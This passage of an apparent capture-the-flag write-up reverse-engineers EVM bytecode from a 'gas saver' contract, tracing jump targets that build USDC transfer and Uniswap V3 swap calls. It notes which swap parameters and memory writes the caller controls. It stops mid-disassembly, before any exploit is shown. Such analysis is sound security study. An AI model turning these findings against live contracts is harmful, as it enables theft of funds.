+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0x1b</span> <span class="o">-&gt;</span> <span class="n">call</span> <span class="n">WETH</span> <span class="ow">and</span> <span class="n">STOP</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0x6b</span> <span class="o">-&gt;</span> <span class="n">It</span> <span class="n">just</span> <span class="k">continue</span> <span class="n">execution</span> <span class="ow">and</span> <span class="n">compare</span> <span class="n">calldataload</span> <span class="n">whether</span> <span class="n">it</span> <span class="n">is</span> <span class="n">setOwner</span> <span class="ow">or</span> <span class="ow">not</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0x80</span> <span class="o">-&gt;</span> <span class="n">STOP</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0x82</span> <span class="o">-&gt;</span> <span class="n">JUMP</span> <span class="n">TO</span> <span class="n">owner</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0x8b</span> <span class="o">-&gt;</span> <span class="n">STOP</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0x8d</span> <span class="o">-&gt;</span> <span class="n">REVERT</span> <span class="mh">0x4</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xbd</span> <span class="o">-&gt;</span> <span class="n">Will</span> <span class="k">continue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">jump</span> <span class="n">itself</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xc4</span> <span class="o">-&gt;</span> <span class="n">JUMP</span> <span class="n">to</span> <span class="mh">0x127</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xc9</span> <span class="o">-&gt;</span> <span class="n">JUMP</span> <span class="n">to</span> <span class="mh">0x1E8</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xce</span> <span class="o">-&gt;</span> <span class="n">JUMP</span> <span class="n">to</span> <span class="mh">0x2ae</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xd3</span> <span class="o">-&gt;</span> <span class="n">JUMP</span> <span class="n">to</span> <span class="mh">0x39e</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xd8</span> <span class="o">-&gt;</span> <span class="n">JUMP</span> <span class="n">to</span> <span class="mh">0x32A</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="mh">0xdd</span> <span class="o">-&gt;</span> <span class="n">STOP</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Some interesting things we can see after listing the available <code>JUMPDEST</code> locations is that some of them will actually continue our jump to the two-byte address area. So now, we need to check one by one what each of them does in detail.</p>
+<p><strong>JUMPDEST 0xc4 -&gt; JUMPDEST 0x127</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x127: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x128: PUSH1     0x1a
+</span></span><span class="line"><span class="cl">  0x12a: ADD       
+</span></span><span class="line"><span class="cl">  0x12b: PUSH0     
+</span></span><span class="line"><span class="cl">  0x12c: PUSH0     
+</span></span><span class="line"><span class="cl">  0x12d: PUSH1     0xa4
+</span></span><span class="line"><span class="cl">  0x12f: PUSH0     
+</span></span><span class="line"><span class="cl">  0x130: PUSH0     
+</span></span><span class="line"><span class="cl">  0x131: PUSH1     0x2
+</span></span><span class="line"><span class="cl">  0x133: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x134: PUSH1     0x60
+</span></span><span class="line"><span class="cl">  0x136: SHR       
+</span></span><span class="line"><span class="cl">  0x137: PUSH0     
+</span></span><span class="line"><span class="cl">  0x138: PUSH0     
+</span></span><span class="line"><span class="cl">  0x139: PUSH32    0x22c0d9f00000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x15a: PUSH0     
+</span></span><span class="line"><span class="cl">  0x15b: PUSH32    0xa9059cbb00000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x17c: PUSH0     
+</span></span><span class="line"><span class="cl">  0x17d: MSTORE    
+</span></span><span class="line"><span class="cl">  0x17e: DUP5      
+</span></span><span class="line"><span class="cl">  0x17f: PUSH1     0x4
+</span></span><span class="line"><span class="cl">  0x181: MSTORE    
+</span></span><span class="line"><span class="cl">  0x182: CALLVALUE 
+</span></span><span class="line"><span class="cl">  0x183: PUSH1     0x24
+</span></span><span class="line"><span class="cl">  0x185: MSTORE    
+</span></span><span class="line"><span class="cl">  0x186: PUSH0     
+</span></span><span class="line"><span class="cl">  0x187: PUSH0     
+</span></span><span class="line"><span class="cl">  0x188: PUSH1     0x44
+</span></span><span class="line"><span class="cl">  0x18a: PUSH0     
+</span></span><span class="line"><span class="cl">  0x18b: PUSH0     
+</span></span><span class="line"><span class="cl">  0x18c: PUSH20    0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
+</span></span><span class="line"><span class="cl">  0x1a1: GAS       
+</span></span><span class="line"><span class="cl">  0x1a2: CALL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also use the help of <code>cast</code> debugger to help understand the bytecode easier, but basically it will make a call to <code>0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48</code>, which upon looking at the etherscan, it is a USDC address. Let&rsquo;s keep this in our mind first.</p>
+<p><strong>JUMPDEST 0xc9 -&gt; JUMPDEST 0x1e8</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x1e8: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x1e9: PUSH1     0x30
+</span></span><span class="line"><span class="cl">  0x1eb: ADD       
+</span></span><span class="line"><span class="cl">  0x1ec: PUSH32    0x128acb0800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x20d: PUSH0     
+</span></span><span class="line"><span class="cl">  0x20e: MSTORE    
+</span></span><span class="line"><span class="cl">  0x20f: ADDRESS   
+</span></span><span class="line"><span class="cl">  0x210: PUSH1     0x4
+</span></span><span class="line"><span class="cl">  0x212: MSTORE    
+</span></span><span class="line"><span class="cl">  0x213: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x215: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x216: CHAINID   
+</span></span><span class="line"><span class="cl">  0x217: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x218: PUSH0     
+</span></span><span class="line"><span class="cl">  0x219: BYTE      
+</span></span><span class="line"><span class="cl">  0x21a: MSTORE    
+</span></span><span class="line"><span class="cl">  0x21b: PUSH20    0xfffd8963efd1fc6a506488495d951d5263988d25
+</span></span><span class="line"><span class="cl">  0x230: PUSH1     0x64
+</span></span><span class="line"><span class="cl">  0x232: MSTORE    
+</span></span><span class="line"><span class="cl">  0x233: PUSH1     0xa0
+</span></span><span class="line"><span class="cl">  0x235: PUSH1     0x84
+</span></span><span class="line"><span class="cl">  0x237: MSTORE    
+</span></span><span class="line"><span class="cl">  0x238: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x23a: PUSH1     0xa4
+</span></span><span class="line"><span class="cl">  0x23c: MSTORE    
+</span></span><span class="line"><span class="cl">  0x23d: PUSH32    0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x25e: PUSH1     0xc4
+</span></span><span class="line"><span class="cl">  0x260: MSTORE    
+</span></span><span class="line"><span class="cl">  0x261: PUSH1     0x2
+</span></span><span class="line"><span class="cl">  0x263: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x264: PUSH32    0xffffffffffffffffffffffffffffffffffffffffffff00000000000000000000
+</span></span><span class="line"><span class="cl">  0x285: AND       
+</span></span><span class="line"><span class="cl">  0x286: PUSH2     0x5e9
+</span></span><span class="line"><span class="cl">  0x289: PUSH1     0x40
+</span></span><span class="line"><span class="cl">  0x28b: SHL       
+</span></span><span class="line"><span class="cl">  0x28c: ADD       
+</span></span><span class="line"><span class="cl">  0x28d: PUSH1     0xd8
+</span></span><span class="line"><span class="cl">  0x28f: MSTORE    
+</span></span><span class="line"><span class="cl">  0x290: PUSH1     0x40
+</span></span><span class="line"><span class="cl">  0x292: PUSH0     
+</span></span><span class="line"><span class="cl">  0x293: PUSH1     0xf0
+</span></span><span class="line"><span class="cl">  0x295: PUSH0     
+</span></span><span class="line"><span class="cl">  0x296: PUSH0     
+</span></span><span class="line"><span class="cl">  0x297: PUSH1     0xc
+</span></span><span class="line"><span class="cl">  0x299: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x29a: GAS       
+</span></span><span class="line"><span class="cl">  0x29b: CALL      
+</span></span><span class="line"><span class="cl">  0x29c: CALLVALUE 
+</span></span><span class="line"><span class="cl">  0x29d: PUSH1     0x20
+</span></span><span class="line"><span class="cl">  0x29f: SHL       
+</span></span><span class="line"><span class="cl">  0x2a0: PUSH0     
+</span></span><span class="line"><span class="cl">  0x2a1: MLOAD     
+</span></span><span class="line"><span class="cl">  0x2a2: PUSH0     
+</span></span><span class="line"><span class="cl">  0x2a3: SUB       
+</span></span><span class="line"><span class="cl">  0x2a4: GT        
+</span></span><span class="line"><span class="cl">  0x2a5: AND       
+</span></span><span class="line"><span class="cl">  0x2a6: PUSH2     0x80
+</span></span><span class="line"><span class="cl">  0x2a9: JUMPI     
+</span></span><span class="line"><span class="cl">  0x2aa: PUSH2     0x8d
+</span></span><span class="line"><span class="cl">  0x2ad: JUMP 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To help our life easier, let&rsquo;s just debug this with the help of <code>cast</code> debugger. Notice that similar to the previous code, there is a <code>CALL</code> instruction, so we can start the debugger and try to stop during that call. To run the debugger, simply do this command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast call &lt;gas_saver_address&gt; &lt;calldata&gt; -r &lt;rpc_url&gt; --private-key &lt;priv_key&gt; --trace --debug
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s try to pass <code>0xc94141414141414141</code> calldata and check what happen in the debugger</p>
+<img src="https://i.imgur.com/npk8m5C.png"/>
+<p>Based on the given bytecode and memory inspection in the debugger, we can see that this piece of code will perform a <code>swap(address,bool,int256,uint160,bytes)</code> call (based on the given function selector). From the calldata, we can actually control some of the <code>swap</code> parameters. This is the function selector of a <code>Uniswap</code> pool, and the details of the parameters can be found <a href="https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/interfaces/pool/IUniswapV3PoolActions.sol#L65-L81" target="_blank" rel="noopener noreffer ">here</a>. Based on reading the bytecode:</p>
+<ul>
+<li>It sets the <code>recipient</code> to itself</li>
+<li>It sets <code>zeroForOne</code> to <code>false</code></li>
+<li>It sets <code>sqrtPriceLimitX96</code> to <code>0xfffd8963efd1fc6a506488495d951d5263988d25</code></li>
+<li>It sets the <code>CALL</code> target address to <code>CALLDATALOAD[0x23]</code></li>
+<li>It also partially sets the <code>data</code> parameter, where the data size is <code>0x2c</code>. It sets the first 20 bytes with the address <code>0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2</code>, which is <code>WETH</code>, and we can set the remaining 24 bytes, which is taken from <code>and(CALLDATALOAD[0x2], 0xffffffffffffffffffffffffffffffffffffffffffff00000000000000000000) + (0x5e9 &lt;&lt; 0x40)</code></li>
+<li>We are also given permission to perform a one-time memory write: <code>MSTORE[BYTES(CALDATA[0x1])] = CALDATALOAD[0x2c]</code></li>
+</ul>
+<p>We will discuss more about <code>UniswapV3</code> after we finish reading all of the bytecode.</p>
+<p><strong>JUMPDEST 0xce -&gt; JUMPDEST 0x2ae</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x2ae: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x2af: PUSH1     0x47
+</span></span><span class="line"><span class="cl">  0x2b1: ADD       
+</span></span><span class="line"><span class="cl">  0x2b2: PUSH32    0x128acb0800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x2d3: PUSH0     
+</span></span><span class="line"><span class="cl">  0x2d4: MSTORE    
+</span></span><span class="line"><span class="cl">  0x2d5: ADDRESS   
+</span></span><span class="line"><span class="cl">  0x2d6: PUSH1     0x4
+</span></span><span class="line"><span class="cl">  0x2d8: MSTORE    
+</span></span><span class="line"><span class="cl">  0x2d9: PUSH1     0x43
+</span></span><span class="line"><span class="cl">  0x2db: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x2dc: CHAINID   
+</span></span><span class="line"><span class="cl">  0x2dd: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x2de: PUSH0     
+</span></span><span class="line"><span class="cl">  0x2df: BYTE      
+</span></span><span class="line"><span class="cl">  0x2e0: MSTORE    
+</span></span><span class="line"><span class="cl">  0x2e1: PUSH20    0xfffd8963efd1fc6a506488495d951d5263988d25
+</span></span><span class="line"><span class="cl">  0x2f6: PUSH1     0x64
+</span></span><span class="line"><span class="cl">  0x2f8: MSTORE    
+</span></span><span class="line"><span class="cl">  0x2f9: PUSH1     0xa0
+</span></span><span class="line"><span class="cl">  0x2fb: PUSH1     0x84
+</span></span><span class="line"><span class="cl">  0x2fd: MSTORE    
+</span></span><span class="line"><span class="cl">  0x2fe: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x300: PUSH1     0xa4
+</span></span><span class="line"><span class="cl">  0x302: MSTORE    
+</span></span><span class="line"><span class="cl">  0x303: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x305: PUSH1     0x3
+</span></span><span class="line"><span class="cl">  0x307: PUSH1     0xc4
+</span></span><span class="line"><span class="cl">  0x309: CALLDATACOPY
+</span></span><span class="line"><span class="cl">  0x30a: PUSH1     0x40
+</span></span><span class="line"><span class="cl">  0x30c: PUSH0     
+</span></span><span class="line"><span class="cl">  0x30d: PUSH1     0xf0
+</span></span><span class="line"><span class="cl">  0x30f: PUSH0     
+</span></span><span class="line"><span class="cl">  0x310: PUSH0     
+</span></span><span class="line"><span class="cl">  0x311: PUSH1     0x23
+</span></span><span class="line"><span class="cl">  0x313: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x314: GAS       
+</span></span><span class="line"><span class="cl">  0x315: CALL      
+</span></span><span class="line"><span class="cl">  0x316: CALLVALUE 
+</span></span><span class="line"><span class="cl">  0x317: CHAINID   
+</span></span><span class="line"><span class="cl">  0x318: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x319: CHAINID   
+</span></span><span class="line"><span class="cl">  0x31a: BYTE      
+</span></span><span class="line"><span class="cl">  0x31b: SHL       
+</span></span><span class="line"><span class="cl">  0x31c: PUSH0     
+</span></span><span class="line"><span class="cl">  0x31d: MLOAD     
+</span></span><span class="line"><span class="cl">  0x31e: PUSH0     
+</span></span><span class="line"><span class="cl">  0x31f: SUB       
+</span></span><span class="line"><span class="cl">  0x320: GT        
+</span></span><span class="line"><span class="cl">  0x321: AND       
+</span></span><span class="line"><span class="cl">  0x322: PUSH2     0x80
+</span></span><span class="line"><span class="cl">  0x325: JUMPI     
+</span></span><span class="line"><span class="cl">  0x326: PUSH2     0x8d
+</span></span><span class="line"><span class="cl">  0x329: JUMP 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is quite similar to the previous action, where it will call <code>swap</code>. However, there are differences in the parameters:</p>
+<ul>
+<li>We can set the entire <code>data</code> that will be passed to the <code>swap()</code> function, which is taken from <code>CALLDATA[0x3:0x3+0x2c]</code>.</li>
+<li>We are also given permission to do a one-time memory store: <code>MSTORE[BYTE(CALLDATA[0x1])] = CALLDATALOAD[0x43]</code>.</li>
+</ul>
+<p><strong>JUMPDEST 0xd3 -&gt; JUMPDEST 0x39e</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x39e: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x39f: PUSH1     0x47
+</span></span><span class="line"><span class="cl">  0x3a1: ADD       
+</span></span><span class="line"><span class="cl">  0x3a2: PUSH32    0x128acb0800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x3c3: PUSH0     
+</span></span><span class="line"><span class="cl">  0x3c4: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3c5: ADDRESS   
+</span></span><span class="line"><span class="cl">  0x3c6: PUSH1     0x4
+</span></span><span class="line"><span class="cl">  0x3c8: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3c9: CHAINID   
+</span></span><span class="line"><span class="cl">  0x3ca: PUSH1     0x24
+</span></span><span class="line"><span class="cl">  0x3cc: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3cd: PUSH1     0x43
+</span></span><span class="line"><span class="cl">  0x3cf: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x3d0: CHAINID   
+</span></span><span class="line"><span class="cl">  0x3d1: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x3d2: PUSH0     
+</span></span><span class="line"><span class="cl">  0x3d3: BYTE      
+</span></span><span class="line"><span class="cl">  0x3d4: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3d5: PUSH5     0x1000276a4
+</span></span><span class="line"><span class="cl">  0x3db: PUSH1     0x64
+</span></span><span class="line"><span class="cl">  0x3dd: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3de: PUSH1     0xa0
+</span></span><span class="line"><span class="cl">  0x3e0: PUSH1     0x84
+</span></span><span class="line"><span class="cl">  0x3e2: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3e3: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x3e5: PUSH1     0xa4
+</span></span><span class="line"><span class="cl">  0x3e7: MSTORE    
+</span></span><span class="line"><span class="cl">  0x3e8: PUSH1     0x2c
+</span></span><span class="line"><span class="cl">  0x3ea: PUSH1     0x3
+</span></span><span class="line"><span class="cl">  0x3ec: PUSH1     0xc4
+</span></span><span class="line"><span class="cl">  0x3ee: CALLDATACOPY
+</span></span><span class="line"><span class="cl">  0x3ef: PUSH1     0x40
+</span></span><span class="line"><span class="cl">  0x3f1: PUSH0     
+</span></span><span class="line"><span class="cl">  0x3f2: PUSH1     0xf0
+</span></span><span class="line"><span class="cl">  0x3f4: PUSH0     
+</span></span><span class="line"><span class="cl">  0x3f5: PUSH0     
+</span></span><span class="line"><span class="cl">  0x3f6: PUSH1     0x23
+</span></span><span class="line"><span class="cl">  0x3f8: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x3f9: GAS       
+</span></span><span class="line"><span class="cl">  0x3fa: CALL      
+</span></span><span class="line"><span class="cl">  0x3fb: CALLVALUE 
+</span></span><span class="line"><span class="cl">  0x3fc: CHAINID   
+</span></span><span class="line"><span class="cl">  0x3fd: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x3fe: CHAINID   
+</span></span><span class="line"><span class="cl">  0x3ff: BYTE      
+</span></span><span class="line"><span class="cl">  0x400: SHL       
+</span></span><span class="line"><span class="cl">  0x401: PUSH1     0x20
+</span></span><span class="line"><span class="cl">  0x403: MLOAD     
+</span></span><span class="line"><span class="cl">  0x404: PUSH0     
+</span></span><span class="line"><span class="cl">  0x405: SUB       
+</span></span><span class="line"><span class="cl">  0x406: GT        
+</span></span><span class="line"><span class="cl">  0x407: AND       
+</span></span><span class="line"><span class="cl">  0x408: PUSH2     0x80
+</span></span><span class="line"><span class="cl">  0x40b: JUMPI     
+</span></span><span class="line"><span class="cl">  0x40c: PUSH2     0x8d
+</span></span><span class="line"><span class="cl">  0x40f: JUMP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Again, this is quite similar to the previous action (<code>0xce</code>), which calls <code>swap</code>, with these differences:</p>
+<ul>
+<li>It sets <code>zeroForOne</code> to <code>true</code></li>
+<li>It sets <code>sqrtPriceLimitX96</code> to <code>0x1000276a4</code></li>
+</ul>
+<p><strong>JUMPDEST 0xd8 -&gt; JUMPDEST 0x32a</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x32a: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x32b: PUSH1     0x47
+</span></span><span class="line"><span class="cl">  0x32d: ADD       
+</span></span><span class="line"><span class="cl">  0x32e: PUSH32    0x128acb0800000000000000000000000000000000000000000000000000000000
+</span></span><span class="line"><span class="cl">  0x34f: PUSH0     
+</span></span><span class="line"><span class="cl">  0x350: MSTORE    
+</span></span><span class="line"><span class="cl">  0x351: ADDRESS   
+</span></span><span class="line"><span class="cl">  0x352: PUSH1     0x4
+</span></span><span class="line"><span class="cl">  0x354: MSTORE    
+</span></span><span class="line"><span class="cl">  0x355: CHAINID   
+</span></span><span class="line"><span class="cl">  0x356: PUSH1     0x24
+</span></span><span class="line"><span class="cl">  0x358: MSTORE    
+</span></span><span class="line"><span class="cl">  0x359: PUSH1     0x43
+</span></span><span class="line"><span class="cl">  0x35b: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x35c: CHAINID   
+</span></span><span class="line"><span class="cl">  0x35d: CALLDATALOAD
+</span></span><span class="line"><span class="cl">  0x35e: PUSH0     
+</span></span><span class="line"><span class="cl">  0x35f: BYTE      
+</span></span><span class="line"><span class="cl">  0x360: SHR       
+</span></span><span class="line"><span class="cl">  0x361: PUSH0     
+</span></span><span class="line"><span class="cl">  0x362: SUB       
+</span></span><span class="line"><span class="cl">  0x363: PUSH1     0x44
+</span></span><span class="line"><span class="cl">  0x365: MSTORE    
+</span></span><span class="line"><span class="cl">  0x366: PUSH5     0x1000276a4
+</span></span><span class="line"><span class="cl">  0x36c: PUSH1     0x64
